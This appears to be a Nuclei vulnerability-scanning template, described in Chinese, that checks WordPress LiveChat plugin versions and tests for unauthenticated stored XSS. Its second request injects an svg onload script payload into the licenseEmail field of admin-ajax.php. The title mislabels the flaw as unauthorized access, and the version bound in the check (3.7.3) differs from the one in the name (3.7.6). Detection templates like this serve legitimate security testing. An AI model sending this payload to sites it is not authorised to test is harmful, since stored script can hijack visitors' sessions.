id: wp-livechat-stored-xss

info:
  name: WordPress LiveChat < 3.7.6 - 未授权访问漏洞
  author: 0x_Akoko
  severity: high
  description: |
    该模板用于检测 WordPress LiveChat < 3.7.6 - 未授权访问漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt`、`/wp-admin/admin-ajax.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://wpscan.com/plugin/wp-live-chat-software-for-wordpress/
    - https://wordpress.org/plugins/wp-live-chat-software-for-wordpress
  metadata:
    verified: true
    max-request: 2
  tags: wpscan,wordpress,wp-plugin,livechat,xss,stored-xss,unauth

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "LiveChat")'
          - 'compare_versions(version, "< 3.7.3")'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: version
        part: body
        regex:
          - '(?i)Stable tag:\s*([\w.]+)'
        group: 1
        internal: true

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        licenseNumber=42&licenseEmail=%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 400
        condition: or

      - type: word
        part: body
        words:
          - "0"
